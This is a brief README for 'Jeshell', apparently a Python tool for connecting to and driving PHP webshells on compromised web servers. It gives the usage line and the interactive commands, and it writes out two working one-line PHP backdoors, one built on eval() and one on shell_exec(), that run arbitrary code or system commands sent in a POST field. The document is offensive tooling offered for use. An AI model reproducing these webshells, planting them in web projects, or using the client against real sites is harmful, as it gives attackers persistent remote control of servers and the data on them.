# Jeshell
A webshell linker for two type php function Forexample eval() or shell_exec()

Usage: python getshell.py http://127.0.0.1/shell.php  POST  c
Input:
	quit | q 	to quit()
	set 		to set URL,Method,Password
	back |b 	to back 
	help  		for help
	sheel_func type:
			php  --phpcode function 	Forexample: <?php eval($_POST[c])?>
  			bash --bashcode function 	Forexample: <?php echo shell_exec($_POST[c])?>

